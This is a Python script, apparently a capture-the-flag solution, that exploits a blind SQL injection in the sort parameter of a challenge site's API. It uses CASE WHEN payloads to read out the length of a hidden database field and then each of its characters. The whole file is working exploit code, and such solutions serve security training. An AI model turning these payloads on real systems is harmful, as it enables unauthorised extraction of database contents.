import requests

url = "https://doctor-bye-bye-2fdfbdde12ec.inst8.ctf.fortid.com/api/on-call?sort="

found = False
variable = 8
while not found:
    payload = (f"(CASE WHEN (SELECT length(farewell_note) FROM doctors WHERE slug='doctor-bye-bye')>{variable} THEN (CASE slug WHEN 'ada-pulse' THEN 0 ELSE 1 END) ELSE (CASE slug WHEN 'zoe-last' THEN 0 ELSE 1 END) END)")
    response = requests.get(url + payload.format(variable=variable))
    if "Dr. Ada Pulse" in response.text:
        print(f"Length of farewell_note is greater than {variable}")
        variable += 1
    else:
        print(f"Length of flag is {variable}")
        found = True

flag = ""

#The format og the flag is FortID{...} so i did -7 the variable


for i in range(1, variable - 7):
    for j in range(32, 127):
        payload = (f"(CASE WHEN (SELECT unicode(substr(farewell_note,{i+7},1)) FROM doctors WHERE slug='doctor-bye-bye')>{j} THEN (CASE slug WHEN 'ada-pulse' THEN 0 ELSE 1 END) ELSE (CASE slug WHEN 'zoe-last' THEN 0 ELSE 1 END) END)")
        response = requests.get(url + payload)
        if "Dr. Zoe Last" in response.text:
            print(f"Character at position {i} is {chr(j)}")
            flag += chr(j)
            break

print(f"Flag: FortID{{{flag}}}")